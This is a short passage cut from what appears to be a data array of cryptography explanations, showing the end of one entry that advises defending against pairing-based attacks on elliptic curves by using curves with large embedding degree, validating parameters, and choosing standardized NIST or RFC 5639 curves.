substantial field sizes.\n\n**Defense Strategy** - Use ordinary elliptic curves with large embedding degree. Implement proper parameter validation. Use standardized curves from NIST or RFC 5639 that have been vetted for security properties."
  }
];
